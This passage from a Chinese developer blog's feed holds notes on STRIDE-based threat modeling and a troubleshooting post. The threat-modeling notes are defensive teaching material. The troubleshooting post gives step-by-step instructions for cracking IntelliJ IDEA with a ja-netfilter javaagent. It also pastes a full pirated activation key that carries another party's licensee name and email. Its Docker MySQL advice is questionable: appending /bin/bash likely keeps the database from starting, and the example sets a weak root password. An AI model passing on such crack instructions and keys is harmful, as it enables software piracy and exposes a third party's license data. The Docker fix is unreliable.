privilege)</td><td>授权</td><td>未经授权获取、提升权限</td><td>普通用户提升到管理员</td></tr></tbody></table><p>将系统分解为相关的组件，分析每个组件对应的威胁。</p><ul><li>从外部实体逐次开始，关注有交互的进程，没有交互的进程一般没有威胁。</li></ul><table><thead><tr><th>元素</th><th>P隐私</th><th>S仿冒</th><th>T篡改</th><th>R抵赖</th><th>I泄露</th><th>D拒绝</th><th>E提权</th></tr></thead><tbody><tr><td>外部实体</td><td></td><td>√</td><td></td><td>√</td><td></td><td></td><td></td></tr><tr><td>进程</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>数据存储</td><td>√</td><td></td><td>√</td><td>√</td><td>√</td><td>√</td><td></td></tr><tr><td>数据流</td><td>√</td><td></td><td>√</td><td></td><td>√</td><td>√</td><td></td></tr></tbody></table><h1 id="威胁建模四阶段"><a href="#威胁建模四阶段" class="headerlink" title="威胁建模四阶段"></a>威胁建模四阶段</h1><table><thead><tr><th>阶段</th><th>标题</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>设计</td><td>明确系统的所有要求，并创建数据流关系图。</td></tr><tr><td>2</td><td>中断</td><td>将威胁建模框架应用到数据流关系图，并查找潜在的安全问题。</td></tr><tr><td>3</td><td>修复</td><td>确定如何正确组合安全控制来解决每个问题。</td></tr><tr><td>4</td><td>验证</td><td>验证是否满足了要求，找到了问题并实现了安全控制。</td></tr></tbody></table><h2 id="步骤1-设计"><a href="#步骤1-设计" class="headerlink" title="步骤1 设计"></a>步骤1 设计</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><ul><li>清楚地了解系统的工作原理</li><li>列出系统使用的每个服务</li><li>枚举有关环境和默认安全配置的所有假设</li><li>使用正确的上下文深度级别创建数据流关系图</li></ul><h3 id="提出问题"><a href="#提出问题" class="headerlink" title="提出问题"></a>提出问题</h3><table><thead><tr><th>区域</th><th>问题</th></tr></thead><tbody><tr><td><strong>系统说明</strong></td><td>系统的功能是什么？ 服务处理的业务流程是什么？ 是否明确定义了这些流程？</td></tr><tr><td><strong>系统环境</strong></td><td>系统是在云中还是在本地构建的？ 它将在哪个 OS 上构建？ 是否将使用容器？ 系统是应用程序、服务还是其他完全不同的东西？</td></tr><tr><td><strong>方案</strong></td><td>用户将如何使用系统？ 如何不使用系统？</td></tr><tr><td><strong>权限</strong></td><td>系统是否有脚本执行、数据或硬件访问要求？ 如果有，是哪些要求？</td></tr><tr><td><strong>云提供商</strong></td><td>系统将使用哪个云提供商？ 它提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？</td></tr><tr><td><strong>操作系统</strong></td><td>系统将使用哪种操作系统？ 它提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？</td></tr><tr><td><strong>第一方和第三方</strong></td><td>系统将使用哪些第一方和第三方服务？ 它们提供哪些默认安全配置选项？ 这些选项如何影响系统安全要求？</td></tr><tr><td><strong>帐户</strong></td><td>系统中将使用哪些帐户类型，例如用户和管理员？ 这些帐户是本地帐户还是云帐户？ 它们需要哪些访问权限？为什么？</td></tr><tr><td>标识和访问控制</td><td>系统将如何帮助保护这些帐户？ 它是否依赖于 Microsoft Entra ID？ 是否会使用访问控制列表 (ACL)、多重身份验证 (MFA) 和会话控制等功能？</td></tr><tr><td>令牌和会话</td><td>系统会处理 SOAP API 或 REST API 之类的请求吗？ 它将如何处理不同的会话？</td></tr><tr><td><strong>旁路</strong></td><td>系统是否使用或需要后门？ 如果需要，它将如何工作？</td></tr><tr><td><strong>记录、监视和备份</strong></td><td>系统使用什么机制来记录安全事件、监视异常和备份系统数据？ 它会捕获哪些事件类型？</td></tr><tr><td><strong>网络</strong></td><td>将使用哪些入侵检测和保护系统？ 如何对通信进行加密？</td></tr><tr><td><strong>数据</strong></td><td>系统将创建或处理什么类型的数据？ 数据分类类型是什么？ 系统如何信任数据源？ 它将如何分析数据？ 预期的输入和输出行为是什么？ 如何处理验证？ 如何在所有状态下对数据进行加密？</td></tr><tr><td><strong>机密管理</strong></td><td>系统如何处理密钥、证书和凭据？</td></tr></tbody></table><h3 id="创建数据流图"><a href="#创建数据流图" class="headerlink" title="创建数据流图"></a>创建数据流图</h3><p>数据流图的组成如下：</p><table><thead><tr><th>元素</th><th>形状</th><th>定义</th></tr></thead><tbody><tr><td>过程</td><td><img src="https://learn.microsoft.com/zh-cn/training/modules/tm-introduction-to-threat-modeling/media/process50.png" alt="Process."></td><td>接收、修改输入或将输入重定向到输出的任务，如 Web 服务。</td></tr><tr><td>数据存储</td><td><img src="https://learn.microsoft.com/zh-cn/training/modules/tm-introduction-to-threat-modeling/media/data-store50.png" alt="Data Store."></td><td>永久和临时数据存储，如 Web 缓存和 Azure 托管数据库。</td></tr><tr><td>外部实体</td><td><img src="https://learn.microsoft.com/zh-cn/training/modules/tm-introduction-to-threat-modeling/media/external-entity50.png" alt="External Entity."></td><td>直接控制之外的任务、实体或数据存储，如用户和第三方 API。</td></tr><tr><td>数据流</td><td><img src="https://learn.microsoft.com/zh-cn/training/modules/tm-introduction-to-threat-modeling/media/data-flow50.png" alt="Data-flow."></td><td>进程、数据存储和外部实体之间的数据移动，如连接字符串和有效负载。</td></tr><tr><td>信任边界</td><td><img src="https://learn.microsoft.com/zh-cn/training/modules/tm-introduction-to-threat-modeling/media/trust-boundary-box50.png" alt="Trust Boundary Box."><img src="https://learn.microsoft.com/zh-cn/training/modules/tm-introduction-to-threat-modeling/media/trust-boundary-line50.png" alt="Trust Boundary Line"></td><td>信任区域在数据流经系统时更改，如用户使用 Internet 访问受保护的公司网络时。</td></tr></tbody></table><h3 id="数据流图表中应该包含的信息量"><a href="#数据流图表中应该包含的信息量" class="headerlink" title="数据流图表中应该包含的信息量"></a>数据流图表中应该包含的信息量</h3><p>数据流关系图中包含的信息量取决于几个关键因素：</p><table><thead><tr><th>因素</th><th>说明</th></tr></thead><tbody><tr><td>正在构建的系统类型</td><td>如果系统不处理敏感数据或仅在内部使用，则它需要的上下文可能比面向外部的系统要少</td></tr><tr><td>安全团队所需的上下文</td><td>安全团队在威胁模型中的目标非常精确。 与安全团队交流，确认所需的层次</td></tr></tbody></table><h3 id="关系图层次"><a href="#关系图层次" class="headerlink" title="关系图层次"></a>关系图层次</h3><p>为了帮助你了解要包含的信息量，请在以下四个上下文层次之间进行选择：</p><table><thead><tr><th>层次</th><th>标题</th><th>说明</th></tr></thead><tbody><tr><td>0</td><td>系统</td><td>任何系统的基础。 数据流关系图包含系统的主要部分，并提供足够的上下文，可帮助你了解其工作原理及彼此交互方式。</td></tr><tr><td>1</td><td>流程</td><td>使用额外的数据流关系图，关注系统每个部分的数据流关系图。 用于每个系统，尤其是处理敏感数据的系统。 此层的上下文应有助于确定威胁以及更有效地降低或消除风险的方法。</td></tr><tr><td>2</td><td>子过程</td><td>关注系统中某一部分的每个次级部分的数据流关系图。 用于关键的系统。 示例包括适用于安全环境的系统、处理高度敏感数据的系统或包含高风险评级的系统。</td></tr><tr><td>3</td><td>更详细</td><td>关注高度关键的内核级系统。 数据流关系图详细描述每个子过程。</td></tr></tbody></table><h2 id="步骤2-中断"><a href="#步骤2-中断" class="headerlink" title="步骤2 中断"></a>步骤2 中断</h2><p>在中断阶段，需使用数据流关系图查找针对系统的潜在威胁。 此过程使用威胁建模框架，以帮助你查找最常见的威胁和防范威胁的方法。</p><ul><li>选择以“保护系统”或“了解攻击者”为核心的方法</li><li>使用 STRIDE 框架识别常见威胁</li></ul><h3 id="确定方法侧重点"><a href="#确定方法侧重点" class="headerlink" title="确定方法侧重点"></a>确定方法侧重点</h3><p>首先，选择是要找到保护系统的方法，还是想要尽可能地了解攻击者及其动机。 示例包括：</p><table><thead><tr><th>侧重点</th><th>可以查找的内容示例</th></tr></thead><tbody><tr><td>系统</td><td>发现用户与系统之间的未加密连接存在问题。</td></tr><tr><td>攻击者</td><td>进一步了解方法、动机和强化系统入口点的方法。</td></tr><tr><td>资产</td><td>基于分类数据处理等功能确定关键资产，主要专注于保护这些资产。</td></tr></tbody></table><h3 id="选择威胁框架"><a href="#选择威胁框架" class="headerlink" title="选择威胁框架"></a>选择威胁框架</h3><p>接下来，选择一个框架，帮助生成系统中的潜在威胁。通常使用 STRIDE（六个主要威胁类别的首字母缩写）提供广泛但不完整的威胁列表。</p><p>此框架可帮助你提出有关系统的几个重要问题：</p><table><thead><tr><th>威胁</th><th>定义</th><th>问题</th><th>威胁示例</th></tr></thead><tbody><tr><td>Privacy隐私</td><td>隐私保护</td><td>用户信息防护</td><td>用户隐私被查阅</td></tr><tr><td>Spooling欺骗</td><td>攻击者冒充某人或某物</td><td>通信的双方是否都通过了身份验证？</td><td>通过看似合法的帐户向用户发送一封带有恶意链接和附件的电子邮件，以捕获用户的凭据、数据和设备访问权限</td></tr><tr><td>Tampering篡改</td><td>攻击者在未经授权的情况下更改数据</td><td>如何得知某人无法更改传输中的数据、正在使用的数据或静态数据？</td><td>通过弱 API 调用处理修改内存，导致崩溃和泄漏敏感错误消息</td></tr><tr><td>Repudiation否认性</td><td>攻击者声称尚未执行任何操作</td><td>每个操作是否可以绑定到标识？</td><td>声称没有删除数据库记录</td></tr><tr><td>Information Disclosure信息泄露</td><td>攻击者看到了不应看到的数据</td><td>如何得知某人无法看到传输中的数据、正在使用的数据或静态数据？</td><td>访问安全控制较弱的未授权文档和文件夹</td></tr><tr><td>Dos拒绝服务</td><td>攻击者使你的系统崩溃</td><td>系统中是否存在资源受限的区域？</td><td>向网络发送大量请求</td></tr><tr><td>Elevation of privilege权限提升</td><td>攻击者未经授权而可访问数据</td><td>如何得知某人可以执行此操作？</td><td>利用输入处理逻辑或内存中的弱点来提取数据</td></tr></tbody></table><h2 id="步骤3-修复"><a href="#步骤3-修复" class="headerlink" title="步骤3 修复"></a>步骤3 修复</h2><p>在修复阶段，需要决定如何处理所有威胁。 每个 STRIDE 威胁都对应到一项或多项安全控制，这些控制措施提供不同的功能和类型供你选择。</p><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><ul><li>根据优先级框架或安全 bug 栏衡量每个威胁的优先级</li><li>在 bug 管理服务中将每个威胁作为任务或工作项进行跟踪</li><li>生成对应于 STRIDE 威胁的安全控制建议</li><li>选择一项或多项安全控制类型和功能来应对每个威胁</li><li>解决任务</li></ul><h3 id="设置威胁跟踪工作流"><a href="#设置威胁跟踪工作流" class="headerlink" title="设置威胁跟踪工作流"></a>设置威胁跟踪工作流</h3><h4 id="确定威胁的优先级"><a href="#确定威胁的优先级" class="headerlink" title="确定威胁的优先级"></a>确定威胁的优先级</h4><p>首先，根据优先级框架或安全 bug 栏来衡量每个威胁。 此过程可帮助你计划资源来解决对组织而言更重要的问题。</p><p>此过程使用三个关键变量：</p><table><thead><tr><th>变量</th><th>说明</th></tr></thead><tbody><tr><td><strong>影响</strong></td><td>使用 STRIDE 类别分配影响</td></tr><tr><td><strong>严重性</strong></td><td>使用内部 bug 栏或优先级框架来分配最坏情况下的严重性</td></tr><tr><td><strong>风险</strong></td><td>对安全控制有效性和实现成本进行计算</td></tr></tbody></table><h3 id="评估威胁有效性和成本"><a href="#评估威胁有效性和成本" class="headerlink" title="评估威胁有效性和成本"></a>评估威胁有效性和成本</h3><p>查看对应于 STRIDE 威胁的每项安全控制建议。 记下最有效和成本最低的建议。 以下是一些示例：</p><table><thead><tr><th>威胁</th><th>安全控制</th><th>安全控制示例</th></tr></thead><tbody><tr><td><strong>欺骗</strong></td><td>身份验证</td><td>发送和接收使用数字签名进行签名的消息，以验证来源并确保消息完整性</td></tr><tr><td><strong>篡改</strong></td><td>完整性</td><td>验证输入以防止处理恶意有效负载和错误处理意外行为</td></tr><tr><td><strong>否认性</strong></td><td>不可否认性</td><td>创建和保护包含用户操作和时间戳的安全日志</td></tr><tr><td><strong>信息泄露</strong></td><td>保密性</td><td>应用访问控制列表，以确保合适的用户可以访问适当的数据</td></tr><tr><td><strong>拒绝服务</strong></td><td>可用性</td><td>使用弹性资源管理不断增加或减少的使用量</td></tr><tr><td><strong>权限提升</strong></td><td>授权</td><td>使用最少的访问量运行服务</td></tr></tbody></table><h3 id="安全控制措施类型和功能"><a href="#安全控制措施类型和功能" class="headerlink" title="安全控制措施类型和功能"></a>安全控制措施类型和功能</h3><p>安全控制具有不同的类型和功能。 结合使用时，它们有助于保护系统的安全，并创建多个安全保护层，也称为深层防御。</p><p>你可以选择一种或多种安全控制类型：</p><ul><li>物理类型，如摄像头</li><li>技术类型，如加密</li><li>管理类型，如策略</li></ul><p>它们可能有一项或多项安全控制功能：</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td><strong>预防</strong></td><td>降低威胁的概率或影响，如防火墙</td></tr><tr><td><strong>检测</strong></td><td>识别发生的攻击，如监视</td></tr><tr><td><strong>纠正</strong></td><td>控制系统如何响应其受到的攻击，如系统修补程序</td></tr><tr><td><strong>修复</strong></td><td>从攻击中恢复系统，如备份</td></tr><tr><td><strong>阻碍</strong></td><td>阻止攻击者访问系统，如最低权限</td></tr></tbody></table><h3 id="为每个问题添加安全控制详细信息"><a href="#为每个问题添加安全控制详细信息" class="headerlink" title="为每个问题添加安全控制详细信息"></a>为每个问题添加安全控制详细信息</h3><p>在 bug 管理解决方案中为每个问题添加详细信息，然后使用以下其中一个解决方案解决各个问题。 这在不同组织之间存在略微差异：</p><table><thead><tr><th>解决方案</th><th>描述</th></tr></thead><tbody><tr><td><strong>减轻</strong></td><td>将通过 Bug 修复或重新设计来解决问题，以减轻或消除威胁影响和严重性。</td></tr><tr><td><strong>转移</strong></td><td>由其他系统或团队处理问题。</td></tr><tr><td><strong>避免</strong></td><td>去除系统中包含问题的部分。</td></tr><tr><td><strong>接受</strong></td><td>没有解决方案，将接受风险。 需要经授权的风险决策者的批准，其中决策者可能取决于威胁的严重性。 严重威胁可能需要高级领导的批准，而深层防御风险可能需要高级工程师批准。 与你的团队交流以获得战略指导。</td></tr></tbody></table><h2 id="步骤4-验证"><a href="#步骤4-验证" class="headerlink" title="步骤4 验证"></a>步骤4 验证</h2><p>验证阶段是威胁建模过程的最后一步，通常发生在部署系统之前。 它涉及到确保满足要求、验证假设以及准备好安全控制。</p><h3 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h3><ul><li>确认系统满足所有新旧安全要求</li><li>配置云提供商、操作系统和组件以满足安全要求</li><li>确保使用正确的安全控制解决所有问题</li><li>在部署前对系统进行手动和自动验证</li></ul><h3 id="验证要求和设置默认值"><a href="#验证要求和设置默认值" class="headerlink" title="验证要求和设置默认值"></a>验证要求和设置默认值</h3><p><strong>首先，验证是否满足第一阶段创建的所有要求。</strong></p><p>示例：</p><ul><li>网络安全计划</li><li>机密管理解决方案实施</li><li>日志记录和监视系统</li><li>标识和访问控制</li></ul><p><strong>然后，确保云提供商、操作系统和组件的默认配置设置已更改，可满足所有安全要求。</strong></p><p>示例：</p><ul><li>启用 Azure SQL 数据库透明数据加密以保护磁盘上的数据</li><li>使用基于角色的访问控制 (RBAC) 向用户、组和应用程序分配权限</li><li>跨所有配置文件启用 Windows 防火墙</li></ul><p>应解决 bug 管理解决方案中记录的所有问题并验证所有修补程序。</p><h3 id="执行验证"><a href="#执行验证" class="headerlink" title="执行验证"></a>执行验证</h3><p>最后一部分涉及运行手动和自动验证。部署系统之前必须对其进行验证，验证过程可能包含自动扫描程序、代码评审和渗透测试。 可以在每次部署之前或隔一定的时间（如每 6 - 12 个月）强制执行该过程。</p><p>如果以下任一问题的答案为“是”，最好设置较短的验证周期：</p><ul><li>我的系统会在部使用吗？</li><li>它可以处理机密数据吗？</li><li>我必须遵守某些规定吗？</li><li>我的组织是否要求实施其他安全保护过程，以应对隐私影响、运营风险或开发要求？</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Note by Eric.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;如何做好威胁就建模：&lt;a href=&quot;https://tech.meituan.com/2021/04/08/threat-modeling-secur</summary>
      
    
    
    
    <category term="安全" scheme="https://erickinyae.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="威胁建模" scheme="https://erickinyae.github.io/tags/%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"/>
    
  </entry>
  
  <entry>
    <title>problem-resolved</title>
    <link href="https://erickinyae.github.io/2023/11/17/problem-resolved/"/>
    <id>https://erickinyae.github.io/2023/11/17/problem-resolved/</id>
    <published>2023-11-17T07:13:06.000Z</published>
    <updated>2024-03-06T10:06:03.064Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Finalshell无法上传文件问题"><a href="#Finalshell无法上传文件问题" class="headerlink" title="Finalshell无法上传文件问题"></a>Finalshell无法上传文件问题</h1><p>连接管理器 -&gt; 编辑 -&gt; 认证，登录的信息必须是root用户。</p><h1 id="IDEA2022-3-1-激活失效"><a href="#IDEA2022-3-1-激活失效" class="headerlink" title="IDEA2022.3.1 激活失效"></a>IDEA2022.3.1 激活失效</h1><p>激活方式：<a href="https://www.exception.site/essay/idea-yongjiu-jihuoma">https://www.exception.site/essay/idea-yongjiu-jihuoma</a></p><blockquote><p>在 <code>idea64.exe.vmoptions</code>（idea&#x2F;bin&#x2F;) 配置文件结尾添加如下配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 引用补丁，开头必须以 -javaagent: 开头，后面跟着补丁的绝对路径（可根据你实际的位置进行修改）,注意路径一定要填写正确，且不能包含中文，否则会导致 IDEA 无法启动</span><br><span class="line">-javaagent:D:/ja-netfilter/ja-netfilter.jar</span><br><span class="line"></span><br><span class="line"># 最新 IDEA 版本需要添加下面两行，以支持 Java 17, 否则会报 Key is invalid</span><br><span class="line">--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED</span><br></pre></td></tr></table></figure></blockquote><p> 激活码获取：<a href="https://docs.qq.com/doc/DUXhVa0NLaFB1elVz">https://docs.qq.com/doc/DUXhVa0NLaFB1elVz</a></p><p>当前使用的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NXHAY2OW76-eyJsaWNlbnNlSWQiOiJOWEhBWTJPVzc2IiwibGljZW5zZWVOYW1lIjoiSHVuYW4gSW5zdGl0dXRlIG9mIFNjaWVuY2UgYW5kIFRlY2hub2xvZ3kiLCJhc3NpZ25lZU5hbWUiOiJ6b2xhIGdhcm1zIiwiYXNzaWduZWVFbWFpbCI6InpvbGFfZ2FybXNAaG90bWFpbC5jb20iLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiJGb3IgZWR1Y2F0aW9uYWwgdXNlIG9ubHkiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IkRQTiIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiREIiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlBTIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJJSSIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUlNDIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkdPIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJETSIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUlNGIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkRTIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJQQyIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUkMiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IkNMIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJXUyIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUkQiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlJTMCIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUk0iLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IkFDIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJSU1YiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiREMiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlJTVSIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiRFAiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUERCIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBXUyIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQU0kiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBTIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBDV01QIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBHTyIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUEMiLCJwYWlkVXBUbyI6IjIwMjQtMDItMDkiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFJCIiwicGFpZFVwVG8iOiIyMDI0LTAyLTA5IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBTVyIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJSUyIsInBhaWRVcFRvIjoiMjAyNC0wMi0wOSIsImV4dGVuZGVkIjp0cnVlfV0sIm1ldGFkYXRhIjoiMDEyMDIzMDIwN0xQQUEwMDkwMDkiLCJoYXNoIjoiNDI1NDk2NzkvMjAxMDIwNTY6LTE5MTk3NjU2NzciLCJncmFjZVBlcmlvZERheXMiOjcsImF1dG9Qcm9sb25nYXRlZCI6ZmFsc2UsImlzQXV0b1Byb2xvbmdhdGVkIjpmYWxzZX0=-jld9RLG5lScm+JPCOjY2bVd6Q+EC9HRx2ZAYKm+ySUHk7VqxJ8yvO+RNcgX/s1HiS1HuAqYgkUqNHXzwFS2TbyaDXw27fZk3F8oCvkdYpItKzMx6IRJ4NNffGGAC5U6culHEAWgNPHpQA3Q6Mw34Cz/19P7syAwTMcy3xCDYWII29+gS9LI9I3/HosfI8qLJSDSGrhOfXtHKKEXIg4QguDU13p897IN5u5CNOhXjAu4oKU+ELWBjeIUBS/fkdrDM56JU5hhKKs3JNJ53VPbWSnP2Uhs/isLP9M1UF6rTgY/reCreWvwEsyG0PVadcvr/lydiKi4+FkX/yZIzVOR4aA==-MIIETDCCAjSgAwIBAgIBDzANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIyMTAxMDE2MDU0NFoXDTI0MTAxMTE2MDU0NFowHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMjEwMTAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC/W3uCpU5M2y48rUR/3fFR6y4xj1nOm3rIuGp2brELVGzdgK2BezjnDXpAxVDw5657hBkAUMoyByiDs2MgmVi9IcqdAwpk988/Daaajq9xuU1of59jH9eQ9c3BmsEtdA4boN3VpenYKATwmpKYkJKVc07ZKoXL6kSyZuF7Jq7HoQZcclChbF75QJPGbri3cw9vDk/e46kuzfwpGftvl6+vKibpInO6Dv0ocwImDbOutyZC7E+BwpEm1TJZW4XovMBegHhWC04cJvpH1u98xoR94ichw0jKhdppywARe43rGU96163RckIuFmFDQKZV9SMUrwpQFu4Z2D5yTNqnlLRfAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQU5FZqQ4gnVc+inIeZF+o3ID+VhcEwSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBANLG1anEKid4W87vQkqWaQTkRtFKJ2GFtBeMhvLhIyM6Cg3FdQnMZr0qr9mlV0w289pf/+M14J7S7SgsfwxMJvFbw9gZlwHvhBl24N349GuthshGO9P9eKmNPgyTJzTtw6FedXrrHV99nC7spaY84e+DqfHGYOzMJDrg8xHDYLLHk5Q2z5TlrztXMbtLhjPKrc2+ZajFFshgE5eowfkutSYxeX8uA5czFNT1ZxmDwX1KIelbqhh6XkMQFJui8v8Eo396/sN3RAQSfvBd7Syhch2vlaMP4FAB11AlMKO2x/1hoKiHBU3oU3OKRTfoUTfy1uH3T+t03k1Qkr0dqgHLxiv6QU5WrarR9tx/dapqbsSmrYapmJ7S5+ghc4FTWxXJB1cjJRh3X+gwJIHjOVW+5ZVqXTG2s2Jwi2daDt6XYeigxgL2SlQpeL5kvXNCcuSJurJVcRZFYUkzVv85XfDauqGxYqaehPcK2TzmcXOUWPfxQxLJd2TrqSiO+mseqqkNTb3ZDiYS/ZqdQoGYIUwJqXo+EDgqlmuWUhkWwCkyo4rtTZeAj+nP00v3n8JmXtO30Fip+lxpfsVR3tO1hk4Vi2kmVjXyRkW2G7D7WAVt+91ahFoSeRWlKyb4KcvGvwUaa43fWLem2hyI4di2pZdr3fcYJ3xvL5ejL3m14bKsfoOv</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Docker启动mysql报错"><a href="#Docker启动mysql报错" class="headerlink" title="Docker启动mysql报错"></a>Docker启动mysql报错</h1><p><strong>mysql镜像运行报错： docker: Error response from daemon: No command specified.</strong></p><blockquote><p>在运行命令后加&#x2F;bin&#x2F;bash，应该该镜像是导出的不是直接从仓库下载的。</p></blockquote><p>当通过下列命令启动mysql时报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -p 3306:3306 --name  sample-mysql -e MYSQL_ROOT_PASSWORD=123456 -v /mydata/mysql/log:/var/log/mysql -v /mydata/mysql/data:/var/lib/mysql -v /mydata/mysql/conf:/etc/mysql -d mysql:8.0</span><br></pre></td></tr></table></figure><p><img src="/2023/11/17/problem-resolved/20200525212710417.png" alt="123"></p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p> 是由于命令没启用的缘故，所以需要在运行命令后面追加 &#x2F;bin&#x2F;bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd -p 3306:3306 --name  sample-mysql -e MYSQL_ROOT_PASSWORD=123456 -v /mydata/mysql/log:/var/log/mysql -v /mydata/mysql/data:/var/lib/mysql -v /mydata/mysql/conf:/etc/mysql -d mysql:8.0 /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/2023/11/17/problem-resolved/20200525212831700.png" alt="123"></p><p>问题解决。</p><h1 id="docker启动mysql，启动后迅速关闭"><a href="#docker启动mysql，启动后迅速关闭" class="headerlink" title="docker启动mysql，启动后迅速关闭"></a>docker启动mysql，启动后迅速关闭</h1><p>在启动docker镜像指令中没有加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-itd</span><br></pre></td></tr></table></figure><ol><li><strong><code>-i</code>（–interactive）：</strong> 允许你与容器进行交互。这通常涉及到在容器内部启动一个终端。</li><li><strong><code>-t</code>（–tty）：</strong> 分配一个伪终端（pseudo-TTY）。这允许你在终端中执行命令。</li><li><strong><code>-d</code>（–detach）：</strong> 